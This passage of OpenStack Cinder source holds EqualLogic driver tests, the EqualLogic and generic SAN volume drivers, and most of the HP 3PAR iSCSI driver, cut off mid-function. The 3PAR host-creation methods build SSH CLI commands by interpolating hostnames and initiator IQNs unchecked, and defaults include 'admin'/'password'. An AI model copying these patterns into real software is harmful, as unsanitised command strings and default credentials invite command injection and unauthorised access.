    def test_update_volume_stats(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        self.driver._eql_execute('pool', 'select',
                                 self.configuration.eqlx_pool, 'show').\
            AndReturn(['TotalCapacity: 111GB', 'FreeSpace: 11GB'])
        self.mox.ReplayAll()
        self.driver._update_volume_stats()
        self.assertEqual(self.driver._stats['total_capacity_gb'], 111.0)
        self.assertEqual(self.driver._stats['free_capacity_gb'], 11.0)

    def test_get_volume_stats(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        self.driver._eql_execute('pool', 'select',
                                 self.configuration.eqlx_pool, 'show').\
            AndReturn(['TotalCapacity: 111GB', 'FreeSpace: 11GB'])
        self.mox.ReplayAll()
        stats = self.driver.get_volume_stats(refresh=True)
        self.assertEqual(stats['total_capacity_gb'], float('111.0'))
        self.assertEqual(stats['free_capacity_gb'], float('11.0'))
        self.assertEqual(stats['vendor_name'], 'Dell')

    def test_get_space_in_gb(self):
        self.assertEqual(self.driver._get_space_in_gb('123.0GB'), 123.0)
        self.assertEqual(self.driver._get_space_in_gb('123.0TB'), 123.0 * 1024)
        self.assertEqual(self.driver._get_space_in_gb('1024.0MB'), 1.0)

    def test_get_output(self):

        def _fake_recv(ignore_arg):
            return '%s> ' % self.configuration.eqlx_group_name

        chan = self.mox.CreateMock(paramiko.Channel)
        self.stubs.Set(chan, "recv", _fake_recv)
        self.assertEqual(self.driver._get_output(chan), [_fake_recv(None)])

    def test_get_prefixed_value(self):
        lines = ['Line1 passed', 'Line1 failed']
        prefix = ['Line1', 'Line2']
        expected_output = [' passed', None]
        self.assertEqual(self.driver._get_prefixed_value(lines, prefix[0]),
                         expected_output[0])
        self.assertEqual(self.driver._get_prefixed_value(lines, prefix[1]),
                         expected_output[1])

    def test_ssh_execute(self):
        ssh = self.mox.CreateMock(paramiko.SSHClient)
        chan = self.mox.CreateMock(paramiko.Channel)
        transport = self.mox.CreateMock(paramiko.Transport)
        self.mox.StubOutWithMock(self.driver, '_get_output')
        self.mox.StubOutWithMock(chan, 'invoke_shell')
        expected_output = ['NoError: test run']
        ssh.get_transport().AndReturn(transport)
        transport.open_session().AndReturn(chan)
        chan.invoke_shell()
        self.driver._get_output(chan).AndReturn(expected_output)
        cmd = 'this is dummy command'
        chan.send('stty columns 255' + '\r')
        self.driver._get_output(chan).AndReturn(expected_output)
        chan.send(cmd + '\r')
        self.driver._get_output(chan).AndReturn(expected_output)
        chan.close()
        self.mox.ReplayAll()
        self.assertEqual(self.driver._ssh_execute(ssh, cmd), expected_output)

    def test_ssh_execute_error(self):
        ssh = self.mox.CreateMock(paramiko.SSHClient)
        chan = self.mox.CreateMock(paramiko.Channel)
        transport = self.mox.CreateMock(paramiko.Transport)
        self.mox.StubOutWithMock(self.driver, '_get_output')
        self.mox.StubOutWithMock(ssh, 'get_transport')
        self.mox.StubOutWithMock(chan, 'invoke_shell')
        expected_output = ['Error: test run', '% Error']
        ssh.get_transport().AndReturn(transport)
        transport.open_session().AndReturn(chan)
        chan.invoke_shell()
        self.driver._get_output(chan).AndReturn(expected_output)
        cmd = 'this is dummy command'
        chan.send('stty columns 255' + '\r')
        self.driver._get_output(chan).AndReturn(expected_output)
        chan.send(cmd + '\r')
        self.driver._get_output(chan).AndReturn(expected_output)
        chan.close()
        self.mox.ReplayAll()
        self.assertRaises(processutils.ProcessExecutionError,
                          self.driver._ssh_execute, ssh, cmd)

    def test_with_timeout(self):
        @eqlx.with_timeout
        def no_timeout(cmd, *args, **kwargs):
            return 'no timeout'

        @eqlx.with_timeout
        def w_timeout(cmd, *args, **kwargs):
            time.sleep(1)

        self.assertEqual(no_timeout('fake cmd'), 'no timeout')
        self.assertRaises(exception.VolumeBackendAPIException,
                          w_timeout, 'fake cmd', timeout=0.1)

    def test_local_path(self):
        self.assertRaises(NotImplementedError, self.driver.local_path, '')

#    Copyright (c) 2013 Dell Inc.
#    Copyright 2013 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.

"""Volume driver for Dell EqualLogic Storage."""

import functools
import random

import eventlet
from eventlet import greenthread
import greenlet
from oslo.config import cfg

from cinder import exception
from cinder.openstack.common import excutils
from cinder.openstack.common import log as logging
from cinder.openstack.common import processutils
from cinder import utils
from cinder.volume.drivers.san import SanISCSIDriver

LOG = logging.getLogger(__name__)

eqlx_opts = [
    cfg.StrOpt('eqlx_group_name',
               default='group-0',
               help='Group name to use for creating volumes'),
    cfg.IntOpt('eqlx_cli_timeout',
               default=30,
               help='Timeout for the Group Manager cli command execution'),
    cfg.IntOpt('eqlx_cli_max_retries',
               default=5,
               help='Maximum retry count for reconnection'),
    cfg.BoolOpt('eqlx_use_chap',
                default=False,
                help='Use CHAP authentication for targets?'),
    cfg.StrOpt('eqlx_chap_login',
               default='admin',
               help='Existing CHAP account name'),
    cfg.StrOpt('eqlx_chap_password',
               default='password',
               help='Password for specified CHAP account name',
               secret=True),
    cfg.StrOpt('eqlx_pool',
               default='default',
               help='Pool in which volumes will be created')
]


CONF = cfg.CONF
CONF.register_opts(eqlx_opts)


def with_timeout(f):
    @functools.wraps(f)
    def __inner(self, *args, **kwargs):
        timeout = kwargs.pop('timeout', None)
        gt = eventlet.spawn(f, self, *args, **kwargs)
        if timeout is None:
            return gt.wait()
        else:
            kill_thread = eventlet.spawn_after(timeout, gt.kill)
            try:
                res = gt.wait()
            except greenlet.GreenletExit:
                raise exception.VolumeBackendAPIException(
                    data="Command timed out")
            else:
                kill_thread.cancel()
                return res

    return __inner


class DellEQLSanISCSIDriver(SanISCSIDriver):
    """Implements commands for Dell EqualLogic SAN ISCSI management.

    To enable the driver add the following line to the cinder configuration:
        volume_driver=cinder.volume.drivers.eqlx.DellEQLSanISCSIDriver

    Driver's prerequisites are:
        - a separate volume group set up and running on the SAN
        - SSH access to the SAN
        - a special user must be created which must be able to
            - create/delete volumes and snapshots;
            - clone snapshots into volumes;
            - modify volume access records;

    The access credentials to the SAN are provided by means of the following
    flags
        san_ip=<ip_address>
        san_login=<user name>
        san_password=<user password>
        san_private_key=<file containing SSH private key>

    Thin provision of volumes is enabled by default, to disable it use:
        san_thin_provision=false

    In order to use target CHAP authentication (which is disabled by default)
    SAN administrator must create a local CHAP user and specify the following
    flags for the driver:
        eqlx_use_chap=true
        eqlx_chap_login=<chap_login>
        eqlx_chap_password=<chap_password>

    eqlx_group_name parameter actually represents the CLI prompt message
    without '>' ending. E.g. if prompt looks like 'group-0>', then the
    parameter must be set to 'group-0'

    Also, the default CLI command execution timeout is 30 secs. Adjustable by
        eqlx_cli_timeout=<seconds>
    """

    VERSION = "1.0.0"

    def __init__(self, *args, **kwargs):
        super(DellEQLSanISCSIDriver, self).__init__(*args, **kwargs)
        self.configuration.append_config_values(eqlx_opts)
        self._group_ip = None
        self.sshpool = None

    def _get_output(self, chan):
        out = ''
        ending = '%s> ' % self.configuration.eqlx_group_name
        while not out.endswith(ending):
            out += chan.recv(102400)

        LOG.debug(_("CLI output\n%s"), out)
        return out.splitlines()

    def _get_prefixed_value(self, lines, prefix):
        for line in lines:
            if line.startswith(prefix):
                return line[len(prefix):]
        return

    @with_timeout
    def _ssh_execute(self, ssh, command, *arg, **kwargs):
        transport = ssh.get_transport()
        chan = transport.open_session()
        chan.invoke_shell()

        LOG.debug(_("Reading CLI MOTD"))
        self._get_output(chan)

        cmd = 'stty columns 255'
        LOG.debug(_("Setting CLI terminal width: '%s'"), cmd)
        chan.send(cmd + '\r')
        out = self._get_output(chan)

        LOG.debug(_("Sending CLI command: '%s'"), command)
        chan.send(command + '\r')
        out = self._get_output(chan)

        chan.close()

        if any(line.startswith(('% Error', 'Error:')) for line in out):
            desc = _("Error executing EQL command")
            cmdout = '\n'.join(out)
            LOG.error(cmdout)
            raise processutils.ProcessExecutionError(
                stdout=cmdout, cmd=command, description=desc)
        return out

    def _run_ssh(self, cmd_list, attempts=1):
        utils.check_ssh_injection(cmd_list)
        command = ' '. join(cmd_list)

        if not self.sshpool:
            password = self.configuration.san_password
            privatekey = self.configuration.san_private_key
            min_size = self.configuration.ssh_min_pool_conn
            max_size = self.configuration.ssh_max_pool_conn
            self.sshpool = utils.SSHPool(self.configuration.san_ip,
                                         self.configuration.san_ssh_port,
                                         self.configuration.ssh_conn_timeout,
                                         self.configuration.san_login,
                                         password=password,
                                         privatekey=privatekey,
                                         min_size=min_size,
                                         max_size=max_size)
        try:
            total_attempts = attempts
            with self.sshpool.item() as ssh:
                while attempts > 0:
                    attempts -= 1
                    try:
                        LOG.info(_('EQL-driver: executing "%s"') % command)
                        return self._ssh_execute(
                            ssh, command,
                            timeout=self.configuration.eqlx_cli_timeout)
                    except processutils.ProcessExecutionError:
                        raise
                    except Exception as e:
                        LOG.exception(e)
                        greenthread.sleep(random.randint(20, 500) / 100.0)
                msg = (_("SSH Command failed after '%(total_attempts)r' "
                         "attempts : '%(command)s'") %
                       {'total_attempts': total_attempts, 'command': command})
                raise exception.VolumeBackendAPIException(data=msg)

        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_("Error running SSH command: %s") % command)

    def _eql_execute(self, *args, **kwargs):
        return self._run_ssh(
            args, attempts=self.configuration.eqlx_cli_max_retries)

    def _get_volume_data(self, lines):
        prefix = 'iSCSI target name is '
        target_name = self._get_prefixed_value(lines, prefix)[:-1]
        lun_id = "%s:%s,1 %s 0" % (self._group_ip, '3260', target_name)
        model_update = {}
        model_update['provider_location'] = lun_id
        if self.configuration.eqlx_use_chap:
            model_update['provider_auth'] = 'CHAP %s %s' % \
                (self.configuration.eqlx_chap_login,
                 self.configuration.eqlx_chap_password)
        return model_update

    def _get_space_in_gb(self, val):
        scale = 1.0
        part = 'GB'
        if val.endswith('MB'):
            scale = 1.0 / 1024
            part = 'MB'
        elif val.endswith('TB'):
            scale = 1.0 * 1024
            part = 'TB'
        return scale * float(val.partition(part)[0])

    def _update_volume_stats(self):
        """Retrieve stats info from eqlx group."""

        LOG.debug(_("Updating volume stats"))
        data = {}
        backend_name = "eqlx"
        if self.configuration:
            backend_name = self.configuration.safe_get('volume_backend_name')
        data["volume_backend_name"] = backend_name or 'eqlx'
        data["vendor_name"] = 'Dell'
        data["driver_version"] = self.VERSION
        data["storage_protocol"] = 'iSCSI'

        data['reserved_percentage'] = 0
        data['QoS_support'] = False

        data['total_capacity_gb'] = 'infinite'
        data['free_capacity_gb'] = 'infinite'

        for line in self._eql_execute('pool', 'select',
                                      self.configuration.eqlx_pool, 'show'):
            if line.startswith('TotalCapacity:'):
                out_tup = line.rstrip().partition(' ')
                data['total_capacity_gb'] = self._get_space_in_gb(out_tup[-1])
            if line.startswith('FreeSpace:'):
                out_tup = line.rstrip().partition(' ')
                data['free_capacity_gb'] = self._get_space_in_gb(out_tup[-1])

        self._stats = data

    def _check_volume(self, volume):
        """Check if the volume exists on the Array."""
        command = ['volume', 'select', volume['name'], 'show']
        try:
            self._eql_execute(*command)
        except processutils.ProcessExecutionError as err:
            with excutils.save_and_reraise_exception():
                if err.stdout.find('does not exist.\n') > -1:
                    LOG.debug(_('Volume %s does not exist, '
                                'it may have already been deleted'),
                              volume['name'])
                    raise exception.VolumeNotFound(volume_id=volume['id'])

    def do_setup(self, context):
        """Disable cli confirmation and tune output format."""
        try:
            disabled_cli_features = ('confirmation', 'paging', 'events',
                                     'formatoutput')
            for feature in disabled_cli_features:
                self._eql_execute('cli-settings', feature, 'off')

            for line in self._eql_execute('grpparams', 'show'):
                if line.startswith('Group-Ipaddress:'):
                    out_tup = line.rstrip().partition(' ')
                    self._group_ip = out_tup[-1]

            LOG.info(_("EQL-driver: Setup is complete, group IP is %s"),
                     self._group_ip)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to setup the Dell EqualLogic driver'))

    def create_volume(self, volume):
        """Create a volume."""
        try:
            cmd = ['volume', 'create',
                   volume['name'], "%sG" % (volume['size'])]
            if self.configuration.eqlx_pool != 'default':
                cmd.append('pool')
                cmd.append(self.configuration.eqlx_pool)
            if self.configuration.san_thin_provision:
                cmd.append('thin-provision')
            out = self._eql_execute(*cmd)
            return self._get_volume_data(out)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to create volume %s'), volume['name'])

    def delete_volume(self, volume):
        """Delete a volume."""
        try:
            self._check_volume(volume)
            self._eql_execute('volume', 'select', volume['name'], 'offline')
            self._eql_execute('volume', 'delete', volume['name'])
        except exception.VolumeNotFound:
            LOG.warn(_('Volume %s was not found while trying to delete it'),
                     volume['name'])
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to delete volume %s'), volume['name'])

    def create_snapshot(self, snapshot):
        """"Create snapshot of existing volume on appliance."""
        try:
            out = self._eql_execute('volume', 'select',
                                    snapshot['volume_name'],
                                    'snapshot', 'create-now')
            prefix = 'Snapshot name is '
            snap_name = self._get_prefixed_value(out, prefix)
            self._eql_execute('volume', 'select', snapshot['volume_name'],
                              'snapshot', 'rename', snap_name,
                              snapshot['name'])
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to create snapshot of volume %s'),
                          snapshot['volume_name'])

    def create_volume_from_snapshot(self, volume, snapshot):
        """Create new volume from other volume's snapshot on appliance."""
        try:
            out = self._eql_execute('volume', 'select',
                                    snapshot['volume_name'], 'snapshot',
                                    'select', snapshot['name'],
                                    'clone', volume['name'])
            return self._get_volume_data(out)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to create volume from snapshot %s'),
                          snapshot['name'])

    def create_cloned_volume(self, volume, src_vref):
        """Creates a clone of the specified volume."""
        try:
            src_volume_name = self.configuration.\
                volume_name_template % src_vref['id']
            out = self._eql_execute('volume', 'select', src_volume_name,
                                    'clone', volume['name'])
            return self._get_volume_data(out)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to create clone of volume %s'),
                          volume['name'])

    def delete_snapshot(self, snapshot):
        """Delete volume's snapshot."""
        try:
            self._eql_execute('volume', 'select', snapshot['volume_name'],
                              'snapshot', 'delete', snapshot['name'])
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to delete snapshot %(snap)s of '
                            'volume %(vol)s'),
                          {'snap': snapshot['name'],
                           'vol': snapshot['volume_name']})

    def initialize_connection(self, volume, connector):
        """Restrict access to a volume."""
        try:
            cmd = ['volume', 'select', volume['name'], 'access', 'create',
                   'initiator', connector['initiator']]
            if self.configuration.eqlx_use_chap:
                cmd.extend(['authmethod chap', 'username',                    
                            self.configuration.eqlx_chap_login])
            self._eql_execute(*cmd)
            iscsi_properties = self._get_iscsi_properties(volume)
            return {
                'driver_volume_type': 'iscsi',
                'data': iscsi_properties
            }
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to initialize connection to volume %s'),
                          volume['name'])

    def terminate_connection(self, volume, connector, force=False, **kwargs):
        """Remove access restrictions from a volume."""
        try:
            self._eql_execute('volume', 'select', volume['name'],
                              'access', 'delete', '1')
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to terminate connection to volume %s'),
                          volume['name'])

    def create_export(self, context, volume):
        """Create an export of a volume.

        Driver has nothing to do here for the volume has been exported
        already by the SAN, right after it's creation.
        """
        pass

    def ensure_export(self, context, volume):
        """Ensure an export of a volume.

        Driver has nothing to do here for the volume has been exported
        already by the SAN, right after it's creation. We will just make
        sure that the volume exists on the array and issue a warning.
        """
        try:
            self._check_volume(volume)
        except exception.VolumeNotFound:
            LOG.warn(_('Volume %s is not found!, it may have been deleted'),
                     volume['name'])
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to ensure export of volume %s'),
                          volume['name'])

    def remove_export(self, context, volume):
        """Remove an export of a volume.

        Driver has nothing to do here for the volume has been exported
        already by the SAN, right after it's creation.
        Nothing to remove since there's nothing exported.
        """
        pass

    def extend_volume(self, volume, new_size):
        """Extend the size of the volume."""
        try:
            self._eql_execute('volume', 'select', volume['name'],
                              'size', "%sG" % new_size)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to extend_volume %(name)s from '
                            '%(current_size)sGB to %(new_size)sGB'),
                          {'name': volume['name'],
                           'current_size': volume['size'],
                           'new_size': new_size})

    def local_path(self, volume):
        raise NotImplementedError()

# vim: tabstop=4 shiftwidth=4 softtabstop=4

# Copyright 2011 Justin Santa Barbara
# All Rights Reserved.
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
"""
Default Driver for san-stored volumes.

The unique thing about a SAN is that we don't expect that we can run the volume
controller on the SAN hardware.  We expect to access it over SSH or some API.
"""

import random

from eventlet import greenthread
from oslo.config import cfg

from cinder import exception
from cinder.openstack.common import excutils
from cinder.openstack.common import log as logging
from cinder import utils
from cinder.volume import driver

LOG = logging.getLogger(__name__)

san_opts = [
    cfg.BoolOpt('san_thin_provision',
                default=True,
                help='Use thin provisioning for SAN volumes?'),
    cfg.StrOpt('san_ip',
               default='',
               help='IP address of SAN controller'),
    cfg.StrOpt('san_login',
               default='admin',
               help='Username for SAN controller'),
    cfg.StrOpt('san_password',
               default='',
               help='Password for SAN controller',
               secret=True),
    cfg.StrOpt('san_private_key',
               default='',
               help='Filename of private key to use for SSH authentication'),
    cfg.StrOpt('san_clustername',
               default='',
               help='Cluster name to use for creating volumes'),
    cfg.IntOpt('san_ssh_port',
               default=22,
               help='SSH port to use with SAN'),
    cfg.BoolOpt('san_is_local',
                default=False,
                help='Execute commands locally instead of over SSH; '
                     'use if the volume service is running on the SAN device'),
    cfg.IntOpt('ssh_conn_timeout',
               default=30,
               help="SSH connection timeout in seconds"),
    cfg.IntOpt('ssh_min_pool_conn',
               default=1,
               help='Minimum ssh connections in the pool'),
    cfg.IntOpt('ssh_max_pool_conn',
               default=5,
               help='Maximum ssh connections in the pool'),
]

CONF = cfg.CONF
CONF.register_opts(san_opts)


class SanDriver(driver.VolumeDriver):
    """Base class for SAN-style storage volumes

    A SAN-style storage value is 'different' because the volume controller
    probably won't run on it, so we need to access is over SSH or another
    remote protocol.
    """

    def __init__(self, *args, **kwargs):
        execute = kwargs.pop('execute', self.san_execute)
        super(SanDriver, self).__init__(execute=execute,
                                        *args, **kwargs)
        self.configuration.append_config_values(san_opts)
        self.run_local = self.configuration.san_is_local
        self.sshpool = None

    def san_execute(self, *cmd, **kwargs):
        if self.run_local:
            return utils.execute(*cmd, **kwargs)
        else:
            check_exit_code = kwargs.pop('check_exit_code', None)
            command = ' '.join(cmd)
            return self._run_ssh(command, check_exit_code)

    def _run_ssh(self, command, check_exit_code=True, attempts=1):                    
        if not self.sshpool:
            password = self.configuration.san_password
            privatekey = self.configuration.san_private_key
            min_size = self.configuration.ssh_min_pool_conn
            max_size = self.configuration.ssh_max_pool_conn
            self.sshpool = utils.SSHPool(self.configuration.san_ip,
                                         self.configuration.san_ssh_port,
                                         self.configuration.ssh_conn_timeout,
                                         self.configuration.san_login,
                                         password=password,
                                         privatekey=privatekey,
                                         min_size=min_size,
                                         max_size=max_size)
        last_exception = None
        try:
            total_attempts = attempts
            with self.sshpool.item() as ssh:
                while attempts > 0:
                    attempts -= 1
                    try:
                        return utils.ssh_execute(
                            ssh,
                            command,
                            check_exit_code=check_exit_code)
                    except Exception as e:
                        LOG.error(e)
                        last_exception = e
                        greenthread.sleep(random.randint(20, 500) / 100.0)
                try:
                    raise exception.ProcessExecutionError(
                        exit_code=last_exception.exit_code,
                        stdout=last_exception.stdout,
                        stderr=last_exception.stderr,
                        cmd=last_exception.cmd)
                except AttributeError:
                    raise exception.ProcessExecutionError(
                        exit_code=-1,
                        stdout="",
                        stderr="Error running SSH command",
                        cmd=command)

        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_("Error running SSH command: %s") % command)

    def ensure_export(self, context, volume):
        """Synchronously recreates an export for a logical volume."""
        pass

    def create_export(self, context, volume):
        """Exports the volume."""
        pass

    def remove_export(self, context, volume):
        """Removes an export for a logical volume."""
        pass

    def check_for_setup_error(self):
        """Returns an error if prerequisites aren't met."""
        if not self.run_local:
            if not (self.configuration.san_password or
                    self.configuration.san_private_key):
                raise exception.InvalidInput(
                    reason=_('Specify san_password or san_private_key'))

        # The san_ip must always be set, because we use it for the target
        if not self.configuration.san_ip:
            raise exception.InvalidInput(reason=_("san_ip must be set"))


class SanISCSIDriver(SanDriver, driver.ISCSIDriver):
    def __init__(self, *args, **kwargs):
        super(SanISCSIDriver, self).__init__(*args, **kwargs)

    def _build_iscsi_target_name(self, volume):
        return "%s%s" % (self.configuration.iscsi_target_prefix,
                         volume['name'])


# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2012-2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
"""
Volume driver for HP 3PAR Storage array.
This driver requires 3.1.2 MU2 firmware on the 3PAR array.

You will need to install the python hp3parclient.
sudo pip install hp3parclient

Set the following in the cinder.conf file to enable the
3PAR iSCSI Driver along with the required flags:

volume_driver=cinder.volume.drivers.san.hp.hp_3par_iscsi.HP3PARISCSIDriver
"""

import sys

from hp3parclient import exceptions as hpexceptions

from cinder import exception
from cinder.openstack.common import log as logging
from cinder import utils
import cinder.volume.driver
from cinder.volume.drivers.san.hp import hp_3par_common as hpcommon
from cinder.volume.drivers.san import san

VERSION = 1.1
LOG = logging.getLogger(__name__)
DEFAULT_ISCSI_PORT = 3260


class HP3PARISCSIDriver(cinder.volume.driver.ISCSIDriver):
    """OpenStack iSCSI driver to enable 3PAR storage array.

    Version history:
        1.0 - Initial driver
        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,
              session changes, faster clone, requires 3.1.2 MU2 firmware.

    """
    def __init__(self, *args, **kwargs):
        super(HP3PARISCSIDriver, self).__init__(*args, **kwargs)
        self.common = None
        self.configuration.append_config_values(hpcommon.hp3par_opts)
        self.configuration.append_config_values(san.san_opts)

    def _init_common(self):
        return hpcommon.HP3PARCommon(self.configuration)

    def _check_flags(self):
        """Sanity check to ensure we have required options set."""
        required_flags = ['hp3par_api_url', 'hp3par_username',
                          'hp3par_password', 'san_ip', 'san_login',
                          'san_password']
        self.common.check_flags(self.configuration, required_flags)

    @utils.synchronized('3par', external=True)
    def get_volume_stats(self, refresh):
        self.common.client_login()
        stats = self.common.get_volume_stats(refresh)
        stats['storage_protocol'] = 'iSCSI'
        backend_name = self.configuration.safe_get('volume_backend_name')
        stats['volume_backend_name'] = backend_name or self.__class__.__name__
        self.common.client_logout()
        return stats

    def do_setup(self, context):
        self.common = self._init_common()
        self._check_flags()

        # map iscsi_ip-> ip_port
        #             -> iqn
        #             -> nsp
        self.iscsi_ips = {}
        temp_iscsi_ip = {}

        # use the 3PAR ip_addr list for iSCSI configuration
        if len(self.configuration.hp3par_iscsi_ips) > 0:
            # add port values to ip_addr, if necessary
            for ip_addr in self.configuration.hp3par_iscsi_ips:
                ip = ip_addr.split(':')
                if len(ip) == 1:
                    temp_iscsi_ip[ip_addr] = {'ip_port': DEFAULT_ISCSI_PORT}
                elif len(ip) == 2:
                    temp_iscsi_ip[ip[0]] = {'ip_port': ip[1]}
                else:
                    msg = _("Invalid IP address format '%s'") % ip_addr
                    LOG.warn(msg)

        # add the single value iscsi_ip_address option to the IP dictionary.
        # This way we can see if it's a valid iSCSI IP. If it's not valid,
        # we won't use it and won't bother to report it, see below
        if (self.configuration.iscsi_ip_address not in temp_iscsi_ip):
            ip = self.configuration.iscsi_ip_address
            ip_port = self.configuration.iscsi_port
            temp_iscsi_ip[ip] = {'ip_port': ip_port}

        # get all the valid iSCSI ports from 3PAR
        # when found, add the valid iSCSI ip, ip port, iqn and nsp
        # to the iSCSI IP dictionary
        # ...this will also make sure ssh works.
        iscsi_ports = self.common.get_ports()['iSCSI']
        for (ip, iscsi_info) in iscsi_ports.iteritems():
            if ip in temp_iscsi_ip:
                ip_port = temp_iscsi_ip[ip]['ip_port']
                self.iscsi_ips[ip] = {'ip_port': ip_port,
                                      'nsp': iscsi_info['nsp'],
                                      'iqn': iscsi_info['iqn']
                                      }
                del temp_iscsi_ip[ip]

        # if the single value iscsi_ip_address option is still in the
        # temp dictionary it's because it defaults to $my_ip which doesn't
        # make sense in this context. So, if present, remove it and move on.
        if (self.configuration.iscsi_ip_address in temp_iscsi_ip):
            del temp_iscsi_ip[self.configuration.iscsi_ip_address]

        # lets see if there are invalid iSCSI IPs left in the temp dict
        if len(temp_iscsi_ip) > 0:
            msg = _("Found invalid iSCSI IP address(s) in configuration "
                    "option(s) hp3par_iscsi_ips or iscsi_ip_address '%s.'") % \
                   (", ".join(temp_iscsi_ip))
            LOG.warn(msg)

        if not len(self.iscsi_ips) > 0:
            msg = _('At least one valid iSCSI IP address must be set.')
            raise exception.InvalidInput(reason=(msg))

        self.common.do_setup(context)

    def check_for_setup_error(self):
        """Returns an error if prerequisites aren't met."""
        self._check_flags()

    @utils.synchronized('3par', external=True)
    def create_volume(self, volume):
        self.common.client_login()
        metadata = self.common.create_volume(volume)
        self.common.client_logout()

        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_cloned_volume(self, volume, src_vref):
        """Clone an existing volume."""
        self.common.client_login()
        new_vol = self.common.create_cloned_volume(volume, src_vref)
        self.common.client_logout()

        return {'metadata': new_vol}

    @utils.synchronized('3par', external=True)
    def delete_volume(self, volume):
        self.common.client_login()
        self.common.delete_volume(volume)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def create_volume_from_snapshot(self, volume, snapshot):
        """
        Creates a volume from a snapshot.

        TODO: support using the size from the user.
        """
        self.common.client_login()
        metadata = self.common.create_volume_from_snapshot(volume, snapshot)
        self.common.client_logout()
        return {'metadata': metadata}

    @utils.synchronized('3par', external=True)
    def create_snapshot(self, snapshot):
        self.common.client_login()
        self.common.create_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def delete_snapshot(self, snapshot):
        self.common.client_login()
        self.common.delete_snapshot(snapshot)
        self.common.client_logout()

    @utils.synchronized('3par', external=True)
    def initialize_connection(self, volume, connector):
        """Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        Steps to export a volume on 3PAR
          * Get the 3PAR iSCSI iqn
          * Create a host on the 3par
          * create vlun on the 3par
        """
        self.common.client_login()

        # we have to make sure we have a host
        host = self._create_host(volume, connector)

        # now that we have a host, create the VLUN
        vlun = self.common.create_vlun(volume, host)

        self.common.client_logout()

        iscsi_ip = self._get_iscsi_ip(host['name'])
        iscsi_ip_port = self.iscsi_ips[iscsi_ip]['ip_port']
        iscsi_target_iqn = self.iscsi_ips[iscsi_ip]['iqn']
        info = {'driver_volume_type': 'iscsi',
                'data': {'target_portal': "%s:%s" %
                         (iscsi_ip, iscsi_ip_port),
                         'target_iqn': iscsi_target_iqn,
                         'target_lun': vlun['lun'],
                         'target_discovered': True
                         }
                }
        return info

    @utils.synchronized('3par', external=True)
    def terminate_connection(self, volume, connector, **kwargs):
        """Driver entry point to unattach a volume from an instance."""
        self.common.client_login()
        self.common.terminate_connection(volume,
                                         connector['host'],
                                         connector['initiator'])
        self.common.client_logout()

    def _create_3par_iscsi_host(self, hostname, iscsi_iqn, domain, persona_id):
        """Create a 3PAR host.

        Create a 3PAR host, if there is already a host on the 3par using
        the same iqn but with a different hostname, return the hostname
        used by 3PAR.
        """
        cmd = 'createhost -iscsi -persona %s -domain %s %s %s' % \                    
              (persona_id, domain, hostname, iscsi_iqn)                    
        out = self.common._cli_run(cmd, None)                    
        if out and len(out) > 1:
            return self.common.parse_create_host_error(hostname, out)
        return hostname

    def _modify_3par_iscsi_host(self, hostname, iscsi_iqn):
        # when using -add, you can not send the persona or domain options
        self.common._cli_run('createhost -iscsi -add %s %s'                    
                             % (hostname, iscsi_iqn), None)                    

    def _create_host(self, volume, connector):
        """Creates or modifies existing 3PAR host."""
        # make sure we don't have the host already
        host = None
        hostname = self.common._safe_hostname(connector['host'])
        cpg = self.common.get_cpg(volume, allowSnap=True)
        domain = self.common.get_domain(cpg)
        try:
            host = self.common._get_3par_host(hostname)
            if not host['iSCSIPaths']:
                self._modify_3par_iscsi_host(hostname, connector['initiator'])
                host = self.common._get_3par_host(hostname)
        except hpexceptions.HTTPNotFound:
            # get persona from the volume type extra specs
